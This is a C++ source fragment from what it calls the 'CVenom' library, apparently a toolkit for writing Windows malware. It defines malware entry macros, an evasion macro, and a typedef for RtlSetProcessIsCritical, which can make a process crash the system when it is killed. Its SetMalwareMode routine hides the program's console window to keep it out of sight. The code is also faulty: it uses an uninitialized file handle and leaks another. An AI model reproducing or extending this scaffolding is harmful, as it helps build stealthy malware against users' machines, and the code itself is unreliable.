// Some Macros.
#define RAW 0
#define HEX 1
#define DEC 2
#define BIN 3
#define TCP 4
#define UDP 5

#define FUNCTION_EVADE int x

#define MALWARE_ENTRY int argc, char** argv
#define MALWARE_INIT  argc, argv

#define MALWARE_EXIT 0x00

#define KEEP_PID	0

#define PAMAX	4000

#define ON  0x01
#define OFF 0x00

#define _CRT_SECURE_NO_WARNINGS
#define _CRT_NONSTDC_NO_DEPRECATE
#define WIN32_LEAN_AND_MEAN

#define FILE_EXIST		0x01
#define FILE_NOT_FOUND  0x00

// Headers To Include
#include <iostream>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <thread>

#include <winsock2.h>
#include <windows.h>
#include <psapi.h>
#include <Tlhelp32.h>
#include <Windows.h>
#include <signal.h>

// Accessing Some Functions From Different Namespaces.
using		std::string;
using       	std::remove;

// Custom Data Types And Typedefs

//typedef void (*function)(int);
typedef __p_sig_fn_t function;
typedef long (WINAPI* RtlSetProcessIsCritical)(
			IN  BOOLEAN	bNew,
			OUT BOOLEAN*	pbOld,
			IN  BOOLEAN	bNeedScb);


struct c_malware_stat__t{
	char	name[PAMAX];

	size_t  size;
};

// Global Data For Some CVenom's Functionalities.
char**				_argv__;
int				_argc__;

struct c_malware_stat__t 	Current;
struct c_malware_stat__t*	MALWARE;

// Some Functions For Initializing The Library.
void cvinit(int argc, char** argv){
	HANDLE fh;

	_argv__=argv;
	_argc__=argc;
	MALWARE=&Current;

	Current.size=GetFileSize(fh, NULL);

	strncpy(Current.name, argv[0], PAMAX);

	CloseHandle(fh);

	return;
}

void SetMalwareMode(int mode){
	if (mode == ON){
		HANDLE fh;
		HWND   wh;

		fh=CreateFile(_argv__[0], GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		AllocConsole();
		wh=FindWindow("ConsoleWindowClass", NULL);
		ShowWindow(wh, 0x00);
	}
}

void cvexit(int x){
	exit(x);
}
